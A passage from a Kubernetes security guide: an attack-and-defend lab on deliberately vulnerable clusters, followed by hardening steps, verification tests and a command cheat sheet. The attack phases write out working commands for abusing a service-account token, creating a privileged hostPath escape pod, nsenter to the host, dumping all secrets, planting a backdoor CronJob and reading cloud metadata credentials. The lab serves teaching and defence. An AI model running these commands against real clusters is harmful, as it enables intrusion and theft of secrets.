    minimumpriority: critical            # Only auto-delete on CRITICAL
  labeler:
    enabled: true
    minimumpriority: warning
    labels:
      quarantine: "true"                 # Label for NetworkPolicy match
```

---

## 10. Lab: Attack and Defend a Kubernetes Cluster

This lab walks through a full attack-and-defend cycle using intentionally vulnerable environments. The goal is to execute a complete attack chain, then implement every defensive control from the preceding chapters and verify they prevent the attacks.

### 10.1 Lab Environment Setup

**Option A: Kubernetes Goat**
Kubernetes Goat by Madhu Akula is a deliberately vulnerable Kubernetes cluster for learning.

```bash
# Deploy Kubernetes Goat on a local kind/minikube cluster
git clone https://github.com/madhuakula/kubernetes-goat.git
cd kubernetes-goat

# Create a kind cluster
kind create cluster --name goat --config kind-config.yaml

# Deploy the scenarios
bash setup.sh

# Access the scenarios
kubectl get pods -n default
kubectl port-forward svc/kubernetes-goat-home 1234:80
```

**Option B: kube-security-lab (Custom Setup)**
```yaml
# kind cluster configuration for security lab
# kind-config.yaml
kind: Cluster
apiVersion: kind.x-k8s.io/v1alpha4
nodes:
- role: control-plane
  kubeadmConfigPatches:
  - |
    kind: ClusterConfiguration
    apiServer:
      extraArgs:
        audit-policy-file: /etc/kubernetes/audit-policy.yaml
        audit-log-path: /var/log/kubernetes/audit.log
        audit-log-maxage: "30"
        audit-log-maxbackup: "10"
      extraVolumes:
      - name: audit-policy
        hostPath: /etc/kubernetes/audit-policy.yaml
        mountPath: /etc/kubernetes/audit-policy.yaml
        readOnly: true
      - name: audit-log
        hostPath: /var/log/kubernetes/
        mountPath: /var/log/kubernetes/
        pathType: DirectoryOrCreate
- role: worker
- role: worker
```

### 10.2 Phase 1: Initial Access — Exploit a Vulnerable Application

Deploy a vulnerable web application (simulating SSRF or RCE):

```yaml
# Vulnerable application deployment
apiVersion: apps/v1
kind: Deployment
metadata:
  name: vuln-webapp
  namespace: default
spec:
  replicas: 1
  selector:
    matchLabels:
      app: vuln-webapp
  template:
    metadata:
      labels:
        app: vuln-webapp
    spec:
      serviceAccountName: webapp-sa
      containers:
      - name: webapp
        image: ubuntu:22.04
        command:
        - /bin/bash
        - -c
        - |
          apt-get update && apt-get install -y curl netcat-openbsd dnsutils jq
          echo "Vulnerable webapp running"
          sleep infinity
        # Intentionally insecure for the lab
        securityContext:
          privileged: false
---
# Overprivileged service account (intentional misconfiguration)
apiVersion: v1
kind: ServiceAccount
metadata:
  name: webapp-sa
  namespace: default
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: webapp-excessive-perms
  namespace: default
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: edit                    # Overprivileged — can create pods, read secrets
subjects:
- kind: ServiceAccount
  name: webapp-sa
  namespace: default
```

### 10.3 Phase 2: Container Escape and Privilege Escalation

**Step 1: Enumerate from inside the compromised pod**
```bash
# Get shell in the vulnerable pod (simulating initial access)
kubectl exec -it deployment/vuln-webapp -- /bin/bash

# Inside the pod:

# 1. Gather information
whoami                                                  # Who am I?
cat /etc/os-release                                     # What OS?
mount                                                   # What's mounted?
ls -la /var/run/secrets/kubernetes.io/serviceaccount/    # SA token?
cat /proc/1/cgroup                                      # Container runtime?

# 2. Check API server access
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER=https://kubernetes.default.svc
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# Test connectivity
curl -sk --cacert "$CACERT" -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/api/v1/namespaces/default/pods" | jq '.items[].metadata.name'

# 3. Check permissions (auth can-i equivalent via API)
curl -sk --cacert "$CACERT" -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
  -X POST -H "Content-Type: application/json" \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"default"}}' | \
  jq '.status.resourceRules[] | select(.verbs | index("create"))'
```

**Step 2: RBAC Exploitation — Create a Privileged Pod**
```bash
# The webapp-sa has 'edit' role, which includes create pods
# Create a privileged pod for escape

cat <<'EOF' | curl -sk --cacert "$CACERT" -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  "$APISERVER/api/v1/namespaces/default/pods" -X POST -d @-
{
  "apiVersion": "v1",
  "kind": "Pod",
  "metadata": {
    "name": "escape-pod"
  },
  "spec": {
    "containers": [{
      "name": "escape",
      "image": "ubuntu:22.04",
      "command": ["sleep", "infinity"],
      "securityContext": {
        "privileged": true
      },
      "volumeMounts": [{
        "name": "host-root",
        "mountPath": "/host"
      }]
    }],
    "volumes": [{
      "name": "host-root",
      "hostPath": {
        "path": "/",
        "type": "Directory"
      }
    }],
    "hostPID": true,
    "hostNetwork": true
  }
}
EOF
```

**Step 3: Escape to Host**
```bash
# Exec into the privileged escape pod
# (From the original compromised pod via API)
# Or use kubectl from outside:
kubectl exec -it escape-pod -- /bin/bash

# Inside the escape pod:
# 1. Access host filesystem
ls /host/etc/kubernetes/
cat /host/etc/kubernetes/admin.conf     # Cluster admin kubeconfig

# 2. Use nsenter for full host shell
nsenter -t 1 -m -u -i -n -p -- /bin/bash

# 3. On the host — extract all secrets
export KUBECONFIG=/etc/kubernetes/admin.conf
kubectl get secrets --all-namespaces -o json | \
  jq '.items[] | {namespace: .metadata.namespace, name: .metadata.name, data: .data}'
```

### 10.4 Phase 3: Lateral Movement and Persistence

```bash
# From the host (or using stolen admin kubeconfig):

# 1. Enumerate all namespaces and deployments
kubectl get namespaces
kubectl get deployments --all-namespaces
kubectl get services --all-namespaces

# 2. Access internal services
# Find database services
kubectl get svc --all-namespaces | grep -i -E "postgres|mysql|mongo|redis"

# 3. Create persistence — CronJob in kube-system
kubectl apply -f - <<'EOF'
apiVersion: batch/v1
kind: CronJob
metadata:
  name: system-health-check
  namespace: kube-system
spec:
  schedule: "0 */6 * * *"
  jobTemplate:
    spec:
      template:
        spec:
          serviceAccountName: default
          containers:
          - name: health
            image: ubuntu:22.04
            command: ["bash", "-c", "echo persistent-backdoor && sleep 3600"]
          restartPolicy: OnFailure
EOF

# 4. Access cloud metadata (if running on cloud)
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null
```

### 10.5 Phase 4: Implement All Defensive Controls

Now apply every defense from Chapters 7-9 and verify the attack chain is broken.

**Step 1: Apply Pod Security Standards**
```bash
# Label the default namespace with restricted PSS
kubectl label namespace default \
  pod-security.kubernetes.io/enforce=restricted \
  pod-security.kubernetes.io/enforce-version=latest \
  --overwrite
```

**Step 2: Fix the Service Account**
```bash
# Remove overprivileged binding
kubectl delete rolebinding webapp-excessive-perms -n default

# Create minimal RBAC
kubectl apply -f - <<'EOF'
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: webapp-minimal
  namespace: default
rules:
- apiGroups: [""]
  resources: ["configmaps"]
  verbs: ["get"]
  resourceNames: ["webapp-config"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: webapp-minimal-binding
  namespace: default
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: Role
  name: webapp-minimal
subjects:
- kind: ServiceAccount
  name: webapp-sa
  namespace: default
EOF
```

**Step 3: Apply Network Policies**
```bash
kubectl apply -f - <<'EOF'
# Deny all traffic by default
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-all
  namespace: default
spec:
  podSelector: {}
  policyTypes:
  - Ingress
  - Egress
---
# Allow DNS
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-dns
  namespace: default
spec:
  podSelector: {}
  policyTypes:
  - Egress
  egress:
  - to:
    - namespaceSelector:
        matchLabels:
          kubernetes.io/metadata.name: kube-system
      podSelector:
        matchLabels:
          k8s-app: kube-dns
    ports:
    - protocol: UDP
      port: 53
---
# Allow webapp to receive traffic only on its service port
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: webapp-ingress
  namespace: default
spec:
  podSelector:
    matchLabels:
      app: vuln-webapp
  policyTypes:
  - Ingress
  ingress:
  - ports:
    - protocol: TCP
      port: 8080
---
# Block metadata endpoint
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: deny-metadata
  namespace: default
spec:
  podSelector: {}
  policyTypes:
  - Egress
  egress:
  - to:
    - ipBlock:
        cidr: 0.0.0.0/0
        except:
        - 169.254.169.254/32
EOF
```

**Step 4: Deploy Kyverno Policies**
```bash
# Install Kyverno
kubectl apply -f https://github.com/kyverno/kyverno/releases/latest/download/install.yaml

# Apply security policies
kubectl apply -f - <<'EOF'
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: deny-privileged-and-hostpath
spec:
  validationFailureAction: Enforce
  rules:
  - name: deny-privileged
    match:
      any:
      - resources:
          kinds:
          - Pod
    exclude:
      any:
      - resources:
          namespaces:
          - kube-system
    validate:
      message: "Privileged containers are not allowed."
      pattern:
        spec:
          containers:
          - securityContext:
              privileged: "!true"
  - name: deny-hostpath
    match:
      any:
      - resources:
          kinds:
          - Pod
    exclude:
      any:
      - resources:
          namespaces:
          - kube-system
    validate:
      message: "hostPath volumes are not allowed."
      deny:
        conditions:
          any:
          - key: "{{ request.object.spec.volumes[?hostPath] | length(@) }}"
            operator: GreaterThan
            value: 0
  - name: deny-host-namespaces
    match:
      any:
      - resources:
          kinds:
          - Pod
    validate:
      message: "Host namespaces (hostPID, hostIPC, hostNetwork) are not allowed."
      pattern:
        spec:
          =(hostPID): false
          =(hostIPC): false
          =(hostNetwork): false
EOF
```

**Step 5: Deploy Falco**
```bash
# Install Falco via Helm
helm repo add falcosecurity https://falcosecurity.github.io/charts
helm install falco falcosecurity/falco \
  --namespace falco --create-namespace \
  --set falcosidekick.enabled=true \
  --set falcosidekick.webui.enabled=true \
  --set driver.kind=ebpf
```

**Step 6: Harden the Webapp Deployment**
```yaml
# Hardened webapp deployment
apiVersion: apps/v1
kind: Deployment
metadata:
  name: vuln-webapp
  namespace: default
spec:
  replicas: 1
  selector:
    matchLabels:
      app: vuln-webapp
  template:
    metadata:
      labels:
        app: vuln-webapp
    spec:
      serviceAccountName: webapp-sa
      automountServiceAccountToken: false     # Don't mount SA token
      securityContext:
        runAsNonRoot: true
        runAsUser: 65534
        runAsGroup: 65534
        fsGroup: 65534
        seccompProfile:
          type: RuntimeDefault
      containers:
      - name: webapp
        image: myregistry.io/webapp:1.0@sha256:abc123...
        securityContext:
          allowPrivilegeEscalation: false
          readOnlyRootFilesystem: true
          capabilities:
            drop:
            - ALL
        resources:
          limits:
            cpu: "500m"
            memory: "256Mi"
          requests:
            cpu: "100m"
            memory: "128Mi"
        volumeMounts:
        - name: tmp
          mountPath: /tmp
      volumes:
      - name: tmp
        emptyDir:
          sizeLimit: 50Mi
```

### 10.6 Phase 5: Verify Defenses

**Test 1: Privileged Pod Creation Blocked**
```bash
# Attempt to create a privileged pod — should be denied
kubectl apply -f - <<'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: test-escape
  namespace: default
spec:
  containers:
  - name: escape
    image: ubuntu:22.04
    securityContext:
      privileged: true
EOF
# Expected: Error from server (Forbidden) — admission webhook or PSA blocks it

# Verify the Kyverno policy is blocking
kubectl get policyreport -A
```

**Test 2: hostPath Mount Blocked**
```bash
kubectl apply -f - <<'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: test-hostpath
  namespace: default
spec:
  containers:
  - name: test
    image: ubuntu:22.04
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /
EOF
# Expected: denied by Kyverno and PSA
```

**Test 3: Network Policy Blocks IMDS**
```bash
# From inside a pod in the default namespace
kubectl exec -it deployment/vuln-webapp -- \
  curl -s --connect-timeout 3 http://169.254.169.254/latest/meta-data/
# Expected: connection timeout — blocked by NetworkPolicy
```

**Test 4: SA Token Not Available**
```bash
kubectl exec -it deployment/vuln-webapp -- \
  ls /var/run/secrets/kubernetes.io/serviceaccount/
# Expected: no such file or directory — automountServiceAccountToken: false
```

**Test 5: Falco Detects Suspicious Activity**
```bash
# Trigger a Falco rule by executing a suspicious command in a pod
kubectl exec -it deployment/vuln-webapp -- cat /etc/shadow 2>/dev/null

# Check Falco logs
kubectl logs -l app.kubernetes.io/name=falco -n falco --tail=20
# Expected: Falco alert about sensitive file access
```

**Test 6: Read-Only Root Filesystem**
```bash
kubectl exec -it deployment/vuln-webapp -- touch /testfile
# Expected: Read-only file system error
# Only /tmp should be writable
kubectl exec -it deployment/vuln-webapp -- touch /tmp/testfile
# Expected: success
```

### 10.7 Attack Chain Summary and Defense Mapping

| Attack Phase | Technique | Defense That Blocks It |
|-------------|-----------|----------------------|
| Initial Access | Exploit app vulnerability | Application security (out of scope for K8s) |
| SA Token Theft | Read automounted token | `automountServiceAccountToken: false` |
| API Enumeration | Query API server | Minimal RBAC (no list pods/secrets) |
| Priv Escalation | Create privileged pod | PSA Restricted + Kyverno policy |
| Container Escape | hostPath mount + nsenter | PSA Restricted + Kyverno deny-hostpath |
| Host Access | hostPID + hostNetwork | PSA Restricted + Kyverno deny-host-namespaces |
| IMDS Access | Curl metadata endpoint | NetworkPolicy deny IMDS + egress deny-by-default |
| Lateral Movement | Pod-to-pod communication | NetworkPolicy deny-by-default |
| Persistence | CronJob in kube-system | RBAC (no create CronJobs) + Falco alert |
| Secret Theft | List/get secrets | RBAC (no secrets access) |
| Runtime Detection | Any suspicious activity | Falco + KubeArmor + audit logging |

### 10.8 Cheat Sheet: Essential Security Commands

```bash
# --- Offensive Enumeration ---
kubectl auth can-i --list                              # All permissions
kubectl auth can-i create pods -n kube-system          # Specific check
kubectl get secrets --all-namespaces                   # List all secrets
kubectl get clusterrolebindings -o wide                # Who has what
kubectl get pods --all-namespaces -o json | \
  jq '.items[] | select(.spec.containers[].securityContext.privileged==true) | .metadata.name'
                                                       # Find privileged pods

# --- Defensive Audit ---
kubectl get ns -L pod-security.kubernetes.io/enforce   # PSA enforcement
kubectl get networkpolicies --all-namespaces            # Network policies
kubectl get clusterpolicies                             # Kyverno policies
kubectl get constrainttemplates                         # Gatekeeper templates
kubectl get policyreport -A                             # Policy violations

# --- Runtime Monitoring ---
kubectl logs -l app.kubernetes.io/name=falco -n falco -f    # Falco alerts
kubectl get events --sort-by=.lastTimestamp -A               # Recent events
kubectl logs -n kube-system kube-apiserver-* | \
  grep -E "secrets|exec|clusterrolebindings"                 # API server audit

# --- Node Security ---
kubectl get nodes -o json | jq '.items[] | {
  name: .metadata.name,
  kubeletVersion: .status.nodeInfo.kubeletVersion,
  kernelVersion: .status.nodeInfo.kernelVersion,
  os: .status.nodeInfo.osImage
}'

# --- Pod Security Posture ---
kubectl get pods -A -o json | jq '
  .items[] | select(
    .spec.containers[].securityContext.privileged == true or
    .spec.hostPID == true or
    .spec.hostNetwork == true or
    .spec.hostIPC == true or
    (.spec.volumes[]? | .hostPath) != null
  ) | {
    namespace: .metadata.namespace,
    name: .metadata.name,
    privileged: (.spec.containers[].securityContext.privileged // false),
    hostPID: (.spec.hostPID // false),
    hostNet: (.spec.hostNetwork // false),
    hostPaths: [.spec.volumes[]? | select(.hostPath) | .hostPath.path]
  }'
```

---

## References

1. MITRE ATT&CK — Containers Matrix: https://attack.mitre.org/matrices/enterprise/containers/
2. Kubernetes Security Documentation: https://kubernetes.io/docs/concepts/security/
3. Pod Security Standards: https://kubernetes.io/docs/concepts/security/pod-security-standards/
4. Falco Project: https://falco.org/docs/
5. Kyverno Policies: https://kyverno.io/docs/
6. OPA Gatekeeper: https://open-policy-agent.github.io/gatekeeper/
7. CVE-2019-5736 (runc): https://nvd.nist.gov/vuln/detail/CVE-2019-5736
8. CVE-2022-0847 (DirtyPipe): https://dirtypipe.cm4all.com/
9. Kubernetes Goat: https://madhuakula.com/kubernetes-goat/
10. Tracee by Aqua Security: https://aquasecurity.github.io/tracee/
11. KubeArmor: https://kubearmor.io/
12. Cosign / Sigstore: https://docs.sigstore.dev/
13. Tesla Cryptomining Incident: RedLock CSI Team Report, 2018
14. Siloscape Malware Analysis: Unit 42, Palo Alto Networks, 2021
15. NIST SP 800-190 — Application Container Security Guide
